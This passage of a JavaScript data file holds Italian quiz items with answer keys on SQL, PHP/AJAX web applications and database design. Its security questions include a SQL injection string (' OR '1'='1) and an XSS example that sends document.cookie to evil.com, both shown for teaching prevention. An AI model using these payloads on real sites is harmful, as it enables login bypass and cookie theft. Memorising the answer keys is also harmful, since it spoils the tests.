    },
    {
      id: 6, type: "tf", topic: "SELECT",
      text: "ORDER BY DESC ordina il risultato in ordine crescente.",
      options: ["Vero", "Falso"],
      correct: 1,
      explanation: "FALSO. DESC ordina in ordine DEScendente (dal più grande al più piccolo, dalla Z alla A). ASC ordina in ordine crescente ed è il default se non si specifica nulla."
    },
    {
      id: 7, type: "mc", topic: "Aggregazione",
      text: "Quale funzione di aggregazione SQL conta il numero di righe non NULL in una colonna?",
      options: ["SUM(colonna)", "COUNT(colonna)", "AVG(colonna)", "TOTAL(colonna)"],
      correct: 1,
      explanation: "COUNT(colonna) conta le righe non NULL della colonna. COUNT(*) conta tutte le righe incluse quelle con NULL. SUM() somma i valori, AVG() calcola la media."
    },
    {
      id: 8, type: "open", topic: "Viste",
      text: "Cos'è una VIEW in SQL? Descrivi vantaggi e limitazioni.",
      modelAnswer: "Una VIEW è una tabella virtuale definita da una query SQL salvata con un nome. Non contiene dati fisici: ogni interrogazione esegue la query sottostante. Creazione: CREATE VIEW vista_nome AS SELECT ... Vantaggi: semplifica query complesse ricorrenti, migliora la leggibilità, può limitare i dati visibili per sicurezza (esporre solo alcune colonne/righe), astrae la struttura interna. Limitazioni: in molti DB non si possono fare INSERT/UPDATE su viste complesse (con JOIN, GROUP BY, aggregati). Le viste materializzate (MySQL non le supporta nativamente) memorizzano fisicamente i dati.",
      keywords: ["VIEW", "tabella virtuale", "CREATE VIEW", "query salvata", "sicurezza", "astrazione"]
    },
    {
      id: 9, type: "open", topic: "Trigger",
      text: "Cos'è un trigger in MySQL? Descrivi la sintassi base e un caso d'uso.",
      modelAnswer: "Un trigger è una procedura automatica eseguita prima (BEFORE) o dopo (AFTER) un evento DML (INSERT, UPDATE, DELETE) su una tabella. Sintassi: CREATE TRIGGER nome BEFORE/AFTER INSERT/UPDATE/DELETE ON tabella FOR EACH ROW BEGIN ... END. Si accede ai valori con NEW.colonna (dopo) e OLD.colonna (prima). Caso d'uso: mantenere un log delle modifiche — AFTER UPDATE su Prodotti registra nella tabella Log i valori OLD e NEW del prezzo. Altro caso: validazione pre-insert — BEFORE INSERT controlla che una data sia valida.",
      keywords: ["trigger", "BEFORE", "AFTER", "FOR EACH ROW", "NEW", "OLD", "INSERT", "UPDATE", "DELETE"]
    },
    {
      id: 10, type: "open", topic: "Operatori",
      text: "Spiega gli operatori IN, BETWEEN, ANY e ALL con esempi pratici.",
      modelAnswer: "IN: verifica se un valore è in un insieme. WHERE id IN (1,3,5) o WHERE id IN (SELECT id FROM ...). NOT IN per il contrario. BETWEEN: verifica un intervallo inclusivo. WHERE voto BETWEEN 18 AND 30 equivale a WHERE voto >= 18 AND voto <= 30. ANY: vero se la condizione è vera per almeno un valore della subquery. WHERE voto > ANY (SELECT voto FROM ...). ALL: vero solo se è vera per tutti i valori. WHERE voto > ALL (SELECT ...) — maggiore di ogni valore.",
      keywords: ["IN", "BETWEEN", "ANY", "ALL", "NOT IN", "subquery", "intervallo", "insieme"]
    },
    {
      id: 11, type: "mc", topic: "DML",
      text: "Quale comando SQL si usa per modificare i valori esistenti in una tabella?",
      options: ["INSERT INTO", "MODIFY", "UPDATE ... SET", "ALTER TABLE"],
      correct: 2,
      explanation: "UPDATE tabella SET colonna=valore WHERE condizione. Attenzione: senza WHERE si aggiornano TUTTE le righe. ALTER TABLE modifica la struttura (DDL). INSERT aggiunge nuove righe."
    },
    {
      id: 12, type: "open", topic: "UNION",
      text: "Come funziona UNION in SQL? Qual è la differenza con UNION ALL?",
      modelAnswer: "UNION combina i risultati di due o più SELECT in un unico insieme, ELIMINANDO le righe duplicate (come DISTINCT). UNION ALL combina i risultati MANTENENDO tutti i duplicati (più veloce). Requisiti: stesso numero di colonne nelle SELECT, tipi di dati compatibili. Esempio: SELECT nome FROM Studenti UNION SELECT nome FROM Professori — lista unica di nomi. Usare UNION ALL se si sa già che non ci sono duplicati, o se si vogliono mantenere.",
      keywords: ["UNION", "UNION ALL", "duplicati", "stessa struttura", "combinazione risultati"]
    },
    {
      id: 13, type: "open", topic: "MySQL",
      text: "Spiega INSERT IGNORE e ON DUPLICATE KEY UPDATE in MySQL.",
      modelAnswer: "Entrambi gestiscono i conflitti di chiave univoca. INSERT IGNORE: se l'INSERT viola una chiave univoca/primaria, l'operazione viene silenziata (ignorata, senza errore). Utile quando i duplicati non sono un problema. ON DUPLICATE KEY UPDATE: se c'è conflitto, esegue un UPDATE invece di un errore. Esempio: INSERT INTO Visite(ip, count) VALUES('1.2.3.4', 1) ON DUPLICATE KEY UPDATE count = count + 1. Questo realizza un 'upsert': insert se non esiste, update se esiste. INSERT IGNORE è meno controllato; ON DUPLICATE KEY UPDATE è più preciso.",
      keywords: ["INSERT IGNORE", "ON DUPLICATE KEY UPDATE", "upsert", "chiave univoca", "conflitto", "duplicato"]
    },
    {
      id: 14, type: "mc", topic: "SELECT",
      text: "Nella query: SELECT reparto, AVG(stipendio) FROM Dipendenti GROUP BY reparto HAVING AVG(stipendio) > 2000 — la clausola HAVING filtra:",
      options: [
        "Le righe prima del raggruppamento",
        "I reparti dopo il raggruppamento",
        "Le colonne da visualizzare",
        "L'ordinamento del risultato"
      ],
      correct: 1,
      explanation: "HAVING filtra i gruppi DOPO il GROUP BY. Qui mantiene solo i reparti la cui media stipendio supera 2000. WHERE non può usare funzioni aggregate come AVG()."
    },
    {
      id: 15, type: "open", topic: "Stored Procedure",
      text: "Cosa sono le stored procedure in MySQL? Vantaggi e sintassi base.",
      modelAnswer: "Una stored procedure è un blocco di istruzioni SQL precompilato e salvato sul server con un nome. Chiamata con CALL nomeProcedura(params). Sintassi: CREATE PROCEDURE nomeProc(IN param1 INT, OUT risultato VARCHAR(50)) BEGIN ... END. Vantaggi: performance (precompilata, piano di esecuzione ottimizzato), sicurezza (le app non vedono le query sottostanti), riusabilità e manutenibilità (logica centralizzata sul DB), riduzione del traffico di rete. Limite: logica distribuita tra applicazione e database può rendere il debug complesso.",
      keywords: ["stored procedure", "CREATE PROCEDURE", "CALL", "IN", "OUT", "precompilata", "performance", "riusabilità"]
    }
  ],

  /* ══════════════════════════════════════════════════════════════
     MODULO 5 — Applicazioni Web Integrate
  ══════════════════════════════════════════════════════════════ */
  "applicazioni-web": [
    {
      id: 1, type: "open", topic: "Architettura",
      text: "Descrivi l'architettura client/server delle applicazioni web e come si integrano PHP, JavaScript, AJAX, JSON e MySQL.",
      modelAnswer: "L'utente interagisce con il browser (client). JavaScript gestisce la logica lato client (eventi, DOM, validazione). Quando servono dati dal server, JS invia una richiesta AJAX (XMLHttpRequest) al server. Sul server PHP riceve la richiesta, esegue query SQL su MySQL tramite MySQLi, raccoglie i risultati in un array PHP, li serializza in JSON con json_encode() e restituisce la risposta. JavaScript riceve il JSON, lo deserializza con JSON.parse() e aggiorna dinamicamente il DOM — senza ricaricare la pagina. Il risultato è un'applicazione web reattiva e dinamica.",
      keywords: ["client", "server", "PHP", "JavaScript", "AJAX", "JSON", "MySQL", "MySQLi", "DOM", "json_encode"]
    },
    {
      id: 2, type: "mc", topic: "AJAX",
      text: "In una chiamata AJAX per recuperare dati (sola lettura), quale metodo HTTP è preferibile?",
      options: ["POST", "GET", "PUT", "DELETE"],
      correct: 1,
      explanation: "GET per le richieste di sola lettura: i parametri sono nell'URL, la richiesta è idempotente (ripetibile senza effetti collaterali). POST si usa per inviare/modificare dati."
    },
    {
      id: 3, type: "open", topic: "Sicurezza",
      text: "Cos'è la SQL Injection e come si previene in PHP?",
      modelAnswer: "La SQL Injection è un attacco che inserisce codice SQL malevolo nei parametri di input per manipolare le query del database. Esempio: campo login con valore ' OR '1'='1 che rende sempre vera la condizione. Prevenzione OBBLIGATORIA con Prepared Statements: $stmt = $conn->prepare('SELECT * FROM Utenti WHERE email=? AND pwd=?'); $stmt->bind_param('ss', $email, $pwd); $stmt->execute(); — I parametri vengono separati dalla query, il driver non può confonderli con codice SQL. MAI usare concatenazione di stringhe per costruire query con input utente.",
      keywords: ["SQL Injection", "prepared statements", "bind_param", "concatenazione", "sicurezza", "input utente"]
    },
    {
      id: 4, type: "open", topic: "Viste SQL",
      text: "Spiega come si usano le viste SQL in un'applicazione web PHP. Vantaggi pratici.",
      modelAnswer: "Le viste (VIEW) semplificano il codice PHP: invece di scrivere query complesse con molti JOIN ogni volta, si crea una vista una sola volta nel DB e PHP interroga la vista come se fosse una tabella normale. Esempio: CREATE VIEW v_ordini_dettaglio AS SELECT o.id, c.nome, p.descrizione, o.quantita FROM Ordini o JOIN Clienti c ON o.id_c=c.id JOIN Prodotti p ON o.id_p=p.id. PHP: SELECT * FROM v_ordini_dettaglio WHERE id=?. Vantaggi: codice PHP più semplice e leggibile, logica di join centralizzata nel DB, sicurezza (esporre solo le colonne necessarie), manutenibilità (modifica la vista senza toccare il codice PHP).",
      keywords: ["VIEW", "JOIN", "codice PHP semplificato", "manutenibilità", "sicurezza", "centralizzare logica"]
    },
    {
      id: 5, type: "tf", topic: "AJAX",
      text: "AJAX richiede il ricaricamento completo della pagina per visualizzare i nuovi dati ricevuti dal server.",
      options: ["Vero", "Falso"],
      correct: 1,
      explanation: "FALSO. Il punto fondamentale di AJAX è aggiornare parti della pagina SENZA ricaricarla. Il JavaScript riceve i dati dal server e aggiorna il DOM dinamicamente."
    },
    {
      id: 6, type: "open", topic: "Sicurezza",
      text: "Cos'è il Cross-Site Scripting (XSS) e come si previene?",
      modelAnswer: "XSS è un attacco in cui codice JavaScript malevolo viene iniettato in una pagina web e viene eseguito nel browser di altri utenti. Esempio: un utente inserisce <script>document.location='http://evil.com?cookie='+document.cookie</script> come nome in un form; se PHP stampa questo senza sanitizzare, tutti gli altri utenti che vedono la pagina eseguono lo script. Prevenzione PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8') prima di stampare qualsiasi input utente nell'HTML — trasforma < in &lt;, > in &gt; ecc. Prevenzione JS: usare textContent invece di innerHTML per inserire testo utente nel DOM.",
      keywords: ["XSS", "Cross-Site Scripting", "htmlspecialchars", "innerHTML", "textContent", "script injection", "sanitizzazione"]
    },
    {
      id: 7, type: "open", topic: "Sviluppo",
      text: "Descrivi le fasi di sviluppo di un'applicazione web integrata.",
      modelAnswer: "1. Analisi dei requisiti: definire funzionalità, utenti, dati necessari. 2. Progettazione del database: diagramma E/R, schema relazionale, creazione tabelle MySQL. 3. Progettazione dell'interfaccia: wireframe, HTML/CSS. 4. Sviluppo backend PHP: connessione DB, query SQL, logica business, API endpoint che restituiscono JSON. 5. Sviluppo frontend JavaScript: gestione eventi, chiamate AJAX, aggiornamento DOM, validazione form. 6. Test: funzionali (ogni feature funziona), di sicurezza (XSS, SQL injection), di compatibilità browser. 7. Deploy sul server web. 8. Manutenzione.",
      keywords: ["analisi requisiti", "progettazione DB", "backend PHP", "frontend JS", "test", "deploy", "E/R"]
    },
    {
      id: 8, type: "mc", topic: "Architettura",
      text: "In un'applicazione web PHP+MySQL+JavaScript, quale componente gestisce la logica di accesso al database?",
      options: [
        "JavaScript nel browser",
        "L'HTML della pagina",
        "PHP sul server",
        "Il CSS"
      ],
      correct: 2,
      explanation: "PHP è il linguaggio lato server: esegue le query SQL, interagisce con MySQL, elabora i risultati e li invia al browser. JavaScript gestisce la logica lato client (browser)."
    },
    {
      id: 9, type: "open", topic: "Sicurezza",
      text: "Cos'è il session hijacking e come si previene?",
      modelAnswer: "Il session hijacking è il furto del session_id di un utente per impersonarlo senza conoscerne la password. Il session_id viene solitamente trasmesso via cookie. Prevenzione: 1. Usare HTTPS sempre (crittografa il cookie in transito). 2. Impostare i cookie con flag HttpOnly (JS non può leggere il cookie) e Secure (solo HTTPS). 3. session_regenerate_id(true) dopo il login per generare un nuovo ID. 4. Timeout di sessione breve. 5. Verificare User-Agent e IP per sessioni sospette (opzionale). 6. session_destroy() al logout.",
      keywords: ["session hijacking", "HTTPS", "HttpOnly", "Secure", "session_regenerate_id", "timeout", "cookie"]
    },
    {
      id: 10, type: "open", topic: "CRUD",
      text: "Descrivi le operazioni CRUD in un'applicazione web. Come si mappano su SQL e su HTTP?",
      modelAnswer: "CRUD: Create (creare), Read (leggere), Update (aggiornare), Delete (cancellare) — le quattro operazioni fondamentali su qualsiasi risorsa. Mapping SQL: Create → INSERT INTO, Read → SELECT, Update → UPDATE...SET, Delete → DELETE FROM. Mapping HTTP/REST: Create → POST, Read → GET, Update → PUT o PATCH, Delete → DELETE. In un'app web tipica: form HTML invia POST a PHP → PHP esegue INSERT → risposta di conferma. Tabella HTML mostra dati via SELECT. Pulsante Modifica invia PUT/POST → UPDATE. Pulsante Elimina invia DELETE request → DELETE FROM.",
      keywords: ["CRUD", "CREATE", "READ", "UPDATE", "DELETE", "INSERT", "SELECT", "HTTP", "REST", "POST", "GET"]
    }
  ],

  /* ══════════════════════════════════════════════════════════════
     MODULO 6 — Progettazione concettuale, logica e fisica del DB
  ══════════════════════════════════════════════════════════════ */
  "progettazione-db": [
    {
      id: 1, type: "open", topic: "Fasi",
      text: "Descrivi le tre fasi della progettazione di un database: concettuale, logica e fisica.",
      modelAnswer: "Progettazione concettuale: analisi dei requisiti informali (interviste, documenti), costruzione del diagramma E/R (entità, attributi, associazioni, cardinalità). Indipendente da qualsiasi DBMS. Progettazione logica: traduzione del diagramma E/R in schema relazionale (tabelle, colonne, chiavi primarie ed esterne). Normalizzazione fino alla 3NF per eliminare ridondanze. Ancora indipendente dal DBMS specifico. Progettazione fisica: implementazione concreta in MySQL — CREATE TABLE con tipi di dato scelti, vincoli SQL, indici per performance, phpMyAdmin o HeidiSQL per la creazione.",
      keywords: ["concettuale", "logica", "fisica", "E/R", "schema relazionale", "normalizzazione", "MySQL", "CREATE TABLE"]
    },
    {
      id: 2, type: "open", topic: "E/R",
      text: "Cos'è il diagramma Entità/Relazione (E/R)? Spiega entità, attributi, associazioni e cardinalità.",
      modelAnswer: "Il diagramma E/R è una rappresentazione grafica concettuale della struttura dei dati. Entità: oggetto del mondo reale con esistenza autonoma (es. Studente, Corso). Si rappresenta con un rettangolo. Attributi: proprietà di un'entità (es. nome, cognome, matricola). Si rappresentano con ellissi. Chiave: attributo (o insieme) che identifica univocamente le istanze. Associazione: relazione tra due o più entità (es. FREQUENTA tra Studente e Corso). Si rappresenta con un rombo. Cardinalità: quante istanze di ciascuna entità partecipano all'associazione — 1:1, 1:N, N:N.",
      keywords: ["entità", "attributi", "associazione", "cardinalità", "diagramma E/R", "rettangolo", "rombo", "chiave"]
    },
    {
      id: 3, type: "mc", topic: "E/R",
      text: "In un diagramma E/R, cosa indica una cardinalità N:N tra due entità?",
      options: [
        "Un'istanza di A è associata a una sola istanza di B e viceversa",
        "Un'istanza di A è associata a molte istanze di B, ma ogni B a una sola A",
        "Un'istanza di A può essere associata a molte istanze di B e viceversa",
        "Nessuna associazione tra A e B"
      ],
      correct: 2,
      explanation: "N:N (many-to-many): ogni istanza di A può essere associata a molte istanze di B, e ogni istanza di B a molte di A. Esempio: uno Studente frequenta molti Corsi, un Corso è frequentato da molti Studenti."
    },
    {
      id: 4, type: "open", topic: "E/R",
      text: "Spiega la differenza tra associazioni binarie, unarie e multiple con esempi.",
      modelAnswer: "Associazione binaria: coinvolge due entità distinte. Esempio: LAVORA IN tra Dipendente e Reparto. È il tipo più comune. Associazione unaria (ricorsiva): un'entità è associata con se stessa. Esempio: GESTISCE tra Dipendente e Dipendente (un dipendente gestisce altri dipendenti). L'entità appare due volte nel diagramma con ruoli diversi. Associazione multipla (ternaria+): coinvolge tre o più entità. Esempio: NOLEGGIO tra Cliente, Film e Negozio (un cliente noleggia un film in un negozio specifico). Più complessa da tradurre nel modello relazionale.",
      keywords: ["binaria", "unaria", "ricorsiva", "ternaria", "multipla", "due entità", "stessa entità", "tre entità"]
    },
    {
      id: 5, type: "open", topic: "E/R",
      text: "Cosa sono le entità deboli? Fai un esempio concreto.",
      modelAnswer: "Un'entità debole non ha attributi sufficienti per identificarsi in modo autonomo: dipende da un'entità forte tramite una relazione identificante. La sua chiave primaria è parziale (discriminante) e diventa completa solo combinata con la PK dell'entità forte. Nel diagramma E/R si rappresenta con un doppio rettangolo. Esempio: OrderLine (voce di un ordine) è un'entità debole — una riga dell'ordine si identifica solo con il numero d'ordine (entità forte Order) + numero di riga. Un'altra voce con lo stesso numero di riga in un ordine diverso è un'istanza diversa.",
      keywords: ["entità debole", "entità forte", "relazione identificante", "chiave parziale", "discriminante", "dipendenza"]
    },
    {
      id: 6, type: "tf", topic: "E/R",
      text: "Una generalizzazione ISA indica che un'entità figlia è una specializzazione dell'entità padre.",
      options: ["Vero", "Falso"],
      correct: 0,
      explanation: "VERO. ISA (Is-A) è una relazione di specializzazione/generalizzazione: Studente ISA Persona significa che ogni Studente È UNA Persona. Le figlie ereditano tutti gli attributi del padre e aggiungono i propri."
    },
    {
      id: 7, type: "open", topic: "Logica",
      text: "Come si traduce un'associazione N:N dal modello E/R al modello relazionale?",
      modelAnswer: "Un'associazione N:N non può essere rappresentata direttamente con due tabelle: si crea una terza tabella di associazione (tabella ponte o junction table). Questa tabella contiene: la chiave primaria di entità A come FK, la chiave primaria di entità B come FK, eventuali attributi dell'associazione. La PK della tabella ponte è la combinazione delle due FK (chiave composta). Esempio: Studente(id_stud, nome) N:N Corso(id_corso, titolo) → Iscrizione(id_stud FK, id_corso FK, data_iscrizione) PK(id_stud, id_corso).",
      keywords: ["N:N", "tabella associativa", "junction table", "FK", "PK composta", "tabella ponte", "attributi associazione"]
    },
    {
      id: 8, type: "open", topic: "Normalizzazione",
      text: "Cos'è la normalizzazione? Descrivi la 1NF, 2NF e 3NF con esempi.",
      modelAnswer: "Processo di ristrutturazione dello schema per eliminare ridondanze e anomalie. 1NF: tutti gli attributi devono essere atomici (nessun valore multiplo o composto). Deve esistere una PK. Contro-esempio: Telefoni='333-1,339-2' viola la 1NF. 2NF: soddisfa 1NF + ogni attributo non-chiave dipende dall'intera PK (nessuna dipendenza parziale). Si applica quando la PK è composta. Contro-esempio: Ordine(id_ord, id_prod, nome_prod, quantita) — nome_prod dipende solo da id_prod. 3NF: soddisfa 2NF + nessuna dipendenza transitiva tra non-chiave. Contro-esempio: Impiegato(id, id_reparto, nome_reparto) — nome_reparto dipende da id_reparto, non direttamente dalla PK.",
      keywords: ["1NF", "2NF", "3NF", "atomico", "dipendenza parziale", "dipendenza transitiva", "chiave composta", "anomalie"]
    },
    {
      id: 9, type: "mc", topic: "Normalizzazione",
      text: "Una relazione in 2NF implica necessariamente che sia soddisfatta anche:",
      options: ["Solo la 3NF", "Solo la 1NF", "Sia la 1NF che la 3NF", "Nessuna delle precedenti forme normali"],
      correct: 1,
      explanation: "La normalizzazione è progressiva: 2NF implica 1NF (ogni forma normale superiore soddisfa tutte le inferiori). 2NF non implica 3NF — possono esserci ancora dipendenze transitive."
    },
    {
      id: 10, type: "open", topic: "Anomalie",
      text: "Descrivi le anomalie di inserimento, cancellazione e aggiornamento con un esempio concreto.",
      modelAnswer: "Consideriamo una tabella non normalizzata: OrdineDettaglio(id_ordine, id_cliente, nome_cliente, indirizzo, id_prodotto, nome_prodotto, quantita). Anomalia di inserimento: non si può inserire un nuovo cliente senza avere anche un ordine — dati accoppiati. Anomalia di cancellazione: cancellando l'unico ordine di un cliente si perde anche la sua anagrafica. Anomalia di aggiornamento: se un cliente cambia indirizzo, bisogna aggiornare TUTTE le righe che lo contengono — se si aggiorna solo una parte, i dati diventano inconsistenti. Soluzione: normalizzare in tabelle separate Clienti, Prodotti, Ordini, DettagliOrdini.",
      keywords: ["anomalia inserimento", "anomalia cancellazione", "anomalia aggiornamento", "ridondanza", "inconsistenza", "normalizzazione"]
    },
    {
      id: 11, type: "open", topic: "Dipendenze",
      text: "Cos'è una dipendenza funzionale? Come si identifica in uno schema?",
      modelAnswer: "A → B (A determina funzionalmente B): dato un valore di A, esiste un solo valore di B corrispondente. A è il determinante, B il dipendente. Esempio: Matricola → Cognome (ogni matricola identifica un solo studente). Identificazione: per ogni coppia di attributi chiedersi 'dato X, esiste sempre uno e un solo Y?'. La PK ha dipendenze funzionali verso tutti gli altri attributi. Dipendenza parziale: un non-chiave dipende da PARTE della PK composta. Dipendenza transitiva: A → B e B → C implica A → C, ma B non è chiave. Queste due cause le anomalie di 2NF e 3NF rispettivamente.",
      keywords: ["dipendenza funzionale", "determinante", "dipendente", "PK", "parziale", "transitiva"]
    },
    {
      id: 12, type: "mc", topic: "Logica",
      text: "Come si traduce nel modello relazionale un'associazione con cardinalità 1:N tra entità A e B (A è il lato 'uno')?",
      options: [
        "Si crea una tabella di associazione con le PK di entrambe",
        "La PK di A diventa FK nella tabella B",
        "La PK di B diventa FK nella tabella A",
        "Si fondono A e B in un'unica tabella"
      ],
      correct: 1,
      explanation: "Nella cardinalità 1:N, la PK dell'entità 'uno' (A) diventa FK nell'entità 'molti' (B). Non serve una tabella aggiuntiva. Esempio: Dipartimento(id)←1 — N→Dipendente(id, id_dipartimento FK)."
    },
    {
      id: 13, type: "mc", topic: "Normalizzazione",
      text: "Quale dei seguenti NON è un obiettivo della normalizzazione?",
      options: [
        "Eliminare le ridondanze nei dati",
        "Prevenire le anomalie di aggiornamento",
        "Massimizzare la velocità di esecuzione delle query",
        "Garantire la consistenza dei dati"
      ],
      correct: 2,
      explanation: "La normalizzazione punta a eliminiare ridondanze e anomalie. La velocità delle query (performance) è un obiettivo della progettazione FISICA (indici, denormalizzazione controllata), non della normalizzazione."
    },
    {
      id: 14, type: "open", topic: "Fisica",
      text: "Descrivi la progettazione fisica di un database in MySQL: scelta dei tipi di dato, vincoli e ottimizzazione.",
      modelAnswer: "La progettazione fisica traduce lo schema logico in SQL concreto. Scelta tipi di dato: INT/BIGINT per id, VARCHAR(n) per testi variabili, TEXT per testi lunghi, DATE/DATETIME per date, DECIMAL(p,s) per importi monetari (no FLOAT per i soldi!), BOOLEAN/TINYINT(1) per booleani, ENUM per valori fissi. Vincoli SQL: NOT NULL, UNIQUE, CHECK, DEFAULT, AUTO_INCREMENT per PK. Chiavi esterne: FOREIGN KEY con ON DELETE/UPDATE. Indici: PRIMARY KEY (automatico), FK (automatico in MySQL), indici su colonne usate spesso in WHERE e ORDER BY con CREATE INDEX. Strumenti: phpMyAdmin, HeidiSQL per la gestione visuale.",
      keywords: ["tipi di dato", "INT", "VARCHAR", "DECIMAL", "NOT NULL", "AUTO_INCREMENT", "FOREIGN KEY", "indici", "CREATE INDEX"]
    },
    {
      id: 15, type: "open", topic: "Schema relazionale",
      text: "Come si costruisce uno schema relazionale completo partendo da un diagramma E/R? Regole di traduzione.",
      modelAnswer: "Regole di traduzione: 1. Ogni entità forte → una tabella con PK. 2. Associazione 1:1 → FK nella tabella con partecipazione obbligatoria (o fusione). 3. Associazione 1:N → FK nell'entità N (lato molti). 4. Associazione N:N → nuova tabella con PK=combinazione FK delle due entità. 5. Entità debole → tabella con PK=(discriminante + FK entità forte). 6. Generalizzazione ISA: tre strategie — tabella unica (un'unica tabella con attributo tipo), tabella padre+tabelle figlie (PK condivisa), solo tabelle figlie (attributi padre replicati). 7. Attributi multivalore → tabella separata.",
      keywords: ["tabella", "FK", "PK", "1:N", "N:N", "entità debole", "ISA", "multivalore", "schema relazionale"]
    }
  ]
};
